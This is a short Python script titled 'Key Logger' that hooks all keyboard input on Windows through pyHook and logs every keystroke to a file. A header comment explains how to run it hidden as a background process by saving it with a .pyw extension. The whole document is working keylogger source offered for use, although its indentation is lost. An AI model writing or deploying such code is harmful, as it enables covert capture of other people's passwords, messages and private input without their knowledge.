#Key Logger
#By: Tech B.
#Version 1.0
#Requires pyWin32, pyhook
#To use as background process Save As keylogger.pyw
################

import pythoncom, pyHook, sys, logging


LOG_FILENAME = 'Path//To//Log.out' #I.E. C:\Users\Tech\Desktop\log.out



def OnKeyboardEvent(event):
logging.basicConfig(filename=LOG_FILENAME,
level=logging.DEBUG,
format='%(message)s')
print "Key: ", chr(event.Ascii)
logging.log(10,chr(event.Ascii))
return True

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()